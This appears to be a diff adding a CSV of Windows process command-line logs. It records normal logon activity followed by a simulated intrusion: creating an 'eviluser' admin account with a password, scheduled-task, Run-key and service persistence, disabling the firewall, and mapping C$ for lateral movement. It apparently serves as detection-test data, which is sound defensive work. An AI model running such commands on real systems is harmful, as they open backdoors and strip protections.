@@ -1,0 +1,52 @@
+﻿TimeGenerated,CommandLine
+"Oct 30, 2026 5:48:13 PM",C:\Windows\system32\TSTheme.exe -Embedding
+"Oct 30, 2026 5:48:13 PM","""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26100.4-0\DefenderSessionHelper.exe"""
+"Oct 30, 2026 5:48:14 PM",rdpclip
+"Oct 30, 2026 5:48:14 PM",sihost.exe
+"Oct 30, 2026 5:48:14 PM",C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
+"Oct 30, 2026 5:48:14 PM",C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
+"Oct 30, 2026 5:48:14 PM","""C:\Windows\system32\ServerManagerLauncher.exe"""
+"Oct 30, 2026 5:48:14 PM",taskhostw.exe
+"Oct 30, 2026 5:48:14 PM","""C:\Windows\system32\fclip.exe"""
+"Oct 30, 2026 5:48:14 PM",taskhostw.exe
+"Oct 30, 2026 5:48:14 PM",taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+"Oct 30, 2026 5:48:14 PM",C:\Windows\system32\userinit.exe
+"Oct 30, 2026 5:48:14 PM",C:\Windows\Explorer.EXE
+"Oct 30, 2026 5:48:14 PM","""C:\Windows\System32\ShellHost.exe"""
+"Oct 30, 2026 5:48:15 PM","C:\Windows\system32\rundll32.exe C:\Windows\system32\AppXDeploymentExtensions.OneCore.dll,ShellRefresh"
+"Oct 30, 2026 5:48:16 PM","""C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe"" -ServerName:FullTrustApp.AppXykjsye98af63ez2annt9djke8trg8stn.mca"
+"Oct 30, 2026 5:48:16 PM",C:\Windows\system32\svchost.exe -k UdkSvcGroup -s UdkUserSvc
+"Oct 30, 2026 5:48:17 PM",/QuitInfo:0000000000000294;00000000000002A8; 
+"Oct 30, 2026 5:48:18 PM","""C:\Windows\system32\ServerManager.exe"" "
+"Oct 30, 2026 5:48:24 PM",C:\Windows\System32\smartscreen.exe -Embedding
+"Oct 30, 2026 5:48:24 PM","""C:\Windows\System32\SecurityHealthSystray.exe"" "
+"Oct 30, 2026 5:48:29 PM","""C:\Users\azureuser\AppData\Local\Microsoft\WindowsApps\wt.exe"" "
+"Oct 30, 2026 5:48:29 PM",wt.exe 
+"Oct 30, 2026 5:48:29 PM","""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.12741.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" --headless --textMeasurement graphemes --width 120 --height 30 --signal 0x85c --server 0x84c"
+"Oct 30, 2026 5:48:29 PM",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+"Oct 30, 2026 5:48:43 PM",\\?\C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+"Oct 30, 2026 5:48:44 PM", -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty
+"Oct 30, 2026 5:48:44 PM",taskhostw.exe SyncFromCloud
+"Oct 30, 2026 5:48:46 PM","C:\Windows\system32\rundll32.exe C:\Windows\system32\AppXDeploymentExtensions.OneCore.dll,ShellRefresh"
+"Oct 30, 2026 5:49:08 PM","""C:\Windows\system32\net.exe"" user eviluser P@ssw0rd123! /add"
+"Oct 30, 2026 5:49:08 PM",C:\Windows\system32\net1 user eviluser P@ssw0rd123! /add
+"Oct 30, 2026 5:49:16 PM","""C:\Windows\system32\net.exe"" localgroup Administrators eviluser /add"
+"Oct 30, 2026 5:49:16 PM",C:\Windows\system32\net1 localgroup Administrators eviluser /add
+"Oct 30, 2026 5:49:27 PM","""C:\Windows\system32\whoami.exe"""
+"Oct 30, 2026 5:49:52 PM","""C:\Windows\system32\schtasks.exe"" /create /tn EvilPersistence /tr ""powershell.exe -c Get-Date"" /sc onlogon /ru System"
+"Oct 30, 2026 5:49:58 PM","""C:\Windows\system32\netsh.exe"" advfirewall set allprofiles state off"
+"Oct 30, 2026 5:50:14 PM",C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
+"Oct 30, 2026 5:50:14 PM","""C:\Windows\system32\devicecensus.exe"" UserCxt"
+"Oct 30, 2026 5:51:18 PM","""C:\Windows\system32\reg.exe"" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\loot.txt /f"
+"Oct 30, 2026 5:51:25 PM","""C:\Windows\system32\sc.exe"" create EvilSvc binPath= ""cmd.exe /c echo pwned"" start= auto"
+"Oct 30, 2026 5:51:43 PM","""C:\Windows\system32\runas.exe"" /user:eviluser ""cmd.exe /c whoami"""
+"Oct 30, 2026 5:52:08 PM","""C:\Windows\system32\whoami.exe"""
+"Oct 30, 2026 5:53:13 PM","""C:\Windows\system32\net.exe"" localgroup Administrators"
+"Oct 30, 2026 5:53:13 PM",C:\Windows\system32\net1 localgroup Administrators
+"Oct 30, 2026 5:53:14 PM",taskhostw.exe Logon
+"Oct 30, 2026 5:53:21 PM","""C:\Windows\system32\systeminfo.exe"""
+"Oct 30, 2026 5:55:29 PM","""C:\Windows\system32\net.exe"" use \\localhost\C$ /user:eviluser P@ssw0rd123!"
+"Oct 30, 2026 5:55:56 PM",C:\Windows\system32\wsmprovhost.exe -Embedding
+"Oct 30, 2026 5:55:56 PM","""C:\Windows\system32\whoami.exe"""
+"Oct 30, 2026 5:55:56 PM","""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.12741.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding"
+"Oct 30, 2026 5:56:13 PM","""C:\Windows\system32\sc.exe"" \\localhost create LateralSvc binPath= ""cmd.exe /c echo moved"""
